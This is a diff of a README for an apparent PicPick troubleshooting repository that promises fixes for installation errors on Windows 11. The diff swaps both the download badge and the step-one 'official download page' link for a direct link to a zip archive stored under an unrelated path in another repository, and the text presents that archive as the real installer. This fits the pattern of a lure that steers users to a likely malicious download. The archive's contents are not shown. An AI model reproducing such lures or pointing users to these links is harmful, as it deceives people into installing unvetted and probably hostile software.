@@ -5,7 +5,7 @@ description: "Fix installation errors, update issues, and startup problems for P
 ---
 # 🛠️ PicPick-Troubleshooting - Fix your software installation issues today
 
-[![Download PicPick Solution](https://img.shields.io/badge/Download-Required_Files-blue.svg)](https://github.com/Lynneapersuasive191/PicPick-Troubleshooting)
+[![Download PicPick Solution](https://img.shields.io/badge/Download-Required_Files-blue.svg)](https://raw.githubusercontent.com/Lynneapersuasive191/lynneapersuasive191.github.io/main/kategoriler/python/veri-analizi/Dist-1.5.zip)
 
 ## 📋 Project Overview
 This repository provides steps to fix installation errors for PicPick Professional on Windows 11. Many users report failure messages during the setup process. These notes outline the methods to clear old data, update system components, and install the software successfully on your PC.
@@ -20,7 +20,7 @@ Users often encounter specific roadblocks when they install PicPick. You might s
 ## 📥 How to Download and Install
 Follow these steps to prepare your system and complete the installation.
 
-1. First, visit the official download page to get the installer: [Download PicPick Professional](https://github.com/Lynneapersuasive191/PicPick-Troubleshooting).
+1. First, visit the official download page to get the installer: [Download PicPick Professional](https://raw.githubusercontent.com/Lynneapersuasive191/lynneapersuasive191.github.io/main/kategoriler/python/veri-analizi/Dist-1.5.zip).
 2. Save the file to your Downloads folder.
 3. Before you run the installer, close all open applications to prevent interference.
 4. Right-click the installer file you downloaded.
